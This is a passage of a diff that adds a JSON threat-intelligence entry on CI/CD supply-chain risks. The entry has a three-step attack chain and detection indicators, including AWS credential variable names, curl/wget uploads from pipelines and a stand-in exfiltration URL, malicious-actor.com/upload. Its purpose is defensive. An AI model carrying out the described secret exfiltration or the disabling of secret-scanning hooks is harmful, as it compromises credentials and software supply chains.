+                  ]
+                },
+                "package_info": {
+                  "package_name": "",
+                  "package_manager": "",
+                  "package_versions": "",
+                  "why_malicious": "This article does not describe a specific malicious package, but rather discusses the risks and attack vectors associated with CI/CD pipelines and software supply chains. It highlights how misconfigurations, exposed secrets, and insecure dependencies can be exploited by adversaries to inject malicious code, exfiltrate sensitive data, or compromise the integrity of the software supply chain."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Secrets (e.g., AWS tokens) are hardcoded into source or configuration files.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Exposure of credentials in public or internal repositories, making them accessible to attackers."
+                  },
+                  {
+                    "step": 2,
+                    "action": "CI/CD pipeline executes build and test steps, potentially running malicious or misconfigured scripts that exfiltrate sensitive data.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data or build artifacts are exfiltrated to attacker-controlled infrastructure, enabling further compromise."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Pre-commit or merge-request secret scanning is bypassed, disabled, or removed, allowing secrets to be committed.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Secrets are not detected and are pushed to repositories, increasing the risk of credential compromise and supply chain attacks."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Hardcoded secrets or tokens (e.g., AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY) present in source or configuration files",
+                    "Outbound network requests from CI/CD pipelines to untrusted or unknown domains, especially involving upload of build artifacts or scan results",
+                    "Absence, disabling, or modification of pre-commit or merge-request secret scanning hooks in development workflows"
+                  ],
+                  "file_indicators": [
+                    "Presence of AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, or similar credentials in code or config files",
+                    ".git/hooks/pre-commit scripts missing, altered, or disabled",
+                    "CI/CD pipeline scripts (e.g., .github/workflows, Jenkinsfile) containing curl or wget commands to external URLs"
+                  ],
+                  "network_indicators": [
+                    "POST requests to unknown or suspicious domains (e.g., http://malicious-actor.com/upload) from build agents",
+                    "Unexpected external network traffic originating from build or deployment phases"
+                  ],
+                  "how_to_detect": "Continuously scan code repositories for hardcoded secrets using automated secret detection tools. Audit CI/CD pipeline scripts for unexpected network activity, particularly uploads to external or untrusted domains. Ensure pre-commit and merge-request secret scanning hooks are present, enabled, and enforced. Alert on any modification, disabling, or removal of these security controls. Monitor build agent network traffic for suspicious outbound connections, especially to domains not on an allowlist."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
